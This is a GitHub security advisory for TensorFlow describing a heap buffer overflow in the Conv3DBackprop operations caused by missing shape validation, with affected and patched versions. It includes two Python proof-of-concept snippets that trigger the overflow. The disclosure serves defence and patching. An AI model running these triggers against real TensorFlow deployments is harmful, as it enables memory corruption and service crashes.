# Heap buffer overflow in `Conv3DBackprop\*`

Low

[mihaimaruseac](/mihaimaruseac)
published
GHSA-wcv5-qrj6-9pfm
May 13, 2021

## Package

pip

tensorflow, tensorflow-cpu, tensorflow-gpu
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

< 2.5.0

## Patched versions

2.1.4, 2.2.3, 2.3.3, 2.4.2

## Description

### Impact

Missing validation between arguments to `tf.raw_ops.Conv3DBackprop*` operations can result in heap buffer overflows:

```
import tensorflow as tf

input_sizes = tf.constant([1, 1, 1, 1, 2], shape=[5], dtype=tf.int32)
filter_tensor = tf.constant([734.6274508233133, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0,
                            -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[4, 1, 6, 1, 1], dtype=tf.float32)
out_backprop = tf.constant([-10.0], shape=[1, 1, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropInputV2(input_sizes=input_sizes, filter=filter_tensor, out_backprop=out_backprop, strides=[1, 89, 29, 89, 1], padding='SAME', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

```
import tensorflow as tf

input_values = [-10.0] * (7 * 7 * 7 * 7 * 7)
input_values[0] = 429.6491056791816
input_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)
filter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)
out_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)

tf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding='VALID', data_format='NDHWC', dilations=[1, 1, 1, 1, 1])
```

This is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.

### Patches

We have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).

The fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.

### For more information

Please consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution

This vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.
